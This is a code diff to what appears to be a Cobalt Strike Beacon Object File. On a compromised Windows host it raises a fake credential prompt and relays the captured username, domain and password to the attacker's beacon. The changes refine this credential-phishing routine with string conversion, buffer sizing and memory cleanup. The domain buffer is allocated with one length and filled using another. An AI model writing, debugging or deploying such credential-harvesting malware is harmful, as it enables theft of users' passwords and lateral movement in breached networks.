@@ -14,6 +14,12 @@ typedef struct _THREAD_PARAMS {
 	LPWSTR lpwMessage;
 } THREAD_PARAMS, *PTHREAD_PARAMS;
 
+void ConvertUnicodeStringToChar(const wchar_t* src, size_t srcSize, char* dst, size_t dstSize)
+{
+	KERNEL32$WideCharToMultiByte(CP_ACP, 0, src, (int)srcSize, dst, (int)dstSize, NULL, NULL);
+	dst[dstSize - 1] = '\0';
+}
+
 BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
 	PCHAR pWindowTitle = NULL;
 	LPWSTR pExeName = NULL;
@@ -98,7 +104,7 @@ DWORD WINAPI AskCreds(_In_ PTHREAD_PARAMS params) {
 	ULONG outCredSize = 0;
 	BOOL bSave = FALSE;
 
-	ULONG nSize = 257;
+	ULONG nSize = 256;
 	if (SECUR32$GetUserNameExW(NameSamCompatible, szUsername, &nSize)) {
 		if (!CREDUI$CredPackAuthenticationBufferW(CRED_PACK_GENERIC_CREDENTIALS, (LPWSTR)szUsername, lpwPasswd, 0, &inCredSize) && KERNEL32$GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
 			inCredBuffer = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, inCredSize);
@@ -130,26 +136,38 @@ DWORD WINAPI AskCreds(_In_ PTHREAD_PARAMS params) {
 		);
 
 	if (dwRet == ERROR_SUCCESS) {
-		LPWSTR szUsername = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 514);
-		LPWSTR szPasswd = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 514);
-		LPWSTR szDomain = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 514);
-		DWORD maxLenName = 514;
-		DWORD maxLenPassword = 514;
-		DWORD maxLenDomain = 514;
+		DWORD maxLenName     = 256;
+		DWORD maxLenPassword = 256;
+		DWORD maxLenDomain   = 256;
+		LPWSTR szUsername = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (maxLenName + 1) * sizeof(WCHAR));
+		LPWSTR szPasswd   = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (maxLenPassword + 1) * sizeof(WCHAR));
+		LPWSTR szDomain   = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (maxLenDomain + 1) * sizeof(WCHAR));
 
 		if (CREDUI$CredUnPackAuthenticationBufferW(0, outCredBuffer, outCredSize, szUsername, &maxLenName, szDomain, &maxLenDomain, szPasswd, &maxLenPassword)) {
+
+			char* username = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, maxLenName);
+			char* password = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, maxLenPassword);;
+
+			ConvertUnicodeStringToChar(szUsername, maxLenName, username, maxLenName);
+			ConvertUnicodeStringToChar(szPasswd, maxLenPassword, password, maxLenPassword);
+
 			if (MSVCRT$_wcsicmp(szDomain, L"") == 0) {
 				BeaconPrintf(CALLBACK_OUTPUT,
-					"[+] Username: %ls\n"
-					"[+] Password: %ls\n", szUsername, szPasswd);
-
+					"[+] Username: %s\n"
+					"[+] Password: %s\n", username, password);
 			}
 			else {
+				char* domain = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, maxLenName);;
+				ConvertUnicodeStringToChar(szDomain, maxLenDomain, domain, maxLenDomain);
+
 				BeaconPrintf(CALLBACK_OUTPUT,
-					"[+] Username: %ls\n"
-					"[+] Domainname: %ls\n"
-					"[+] Password: %ls\n", szUsername, szDomain, szPasswd);
+					"[+] Username: %s\n"
+					"[+] Domainname: %s\n"
+					"[+] Password: %s\n", username, domain, password);
+				KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, domain);
 			}
+			KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, username);
+			KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, password);
 		}
 		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, szUsername);
 		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, szPasswd);
@@ -164,21 +182,27 @@ DWORD WINAPI AskCreds(_In_ PTHREAD_PARAMS params) {
 
 	if (inCredBuffer)
 		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, inCredBuffer);
+	if (outCredBuffer)
+		OLE32$CoTaskMemFree(outCredBuffer);
 
 	return dwRet;
 }
 
 VOID go(IN PCHAR Args, IN ULONG Length) {
-	THREAD_PARAMS params;
+	PTHREAD_PARAMS params = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(THREAD_PARAMS));
+	if (!params) {
+		BeaconPrintf(CALLBACK_ERROR, "Failed to allocate memory for thread parameters.\n");
+		return;
+	}
 
 	datap parser;
 	BeaconDataParse(&parser, Args, Length);	
-	params.lpwReason  = (WCHAR*)BeaconDataExtract(&parser, NULL);
-	params.lpwMessage = (WCHAR*)BeaconDataExtract(&parser, NULL);
+	params->lpwReason  = (WCHAR*)BeaconDataExtract(&parser, NULL);
+	params->lpwMessage = (WCHAR*)BeaconDataExtract(&parser, NULL);
     DWORD dwTimeOut = BeaconDataInt(&parser) * 1000;
 
 	DWORD ThreadId = 0;
-	HANDLE hThread = KERNEL32$CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AskCreds, (LPVOID)&params, 0, &ThreadId);
+	HANDLE hThread = KERNEL32$CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AskCreds, (LPVOID)params, 0, &ThreadId);
 	if (hThread == NULL) {
 		BeaconPrintf(CALLBACK_ERROR, "Failed to create thread.\n");
 		return;
@@ -196,6 +220,9 @@ VOID go(IN PCHAR Args, IN ULONG Length) {
 
 	if (hThread)
 		KERNEL32$CloseHandle(hThread);
+
+	if (params)
+		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, params);
 
 	return;
 }
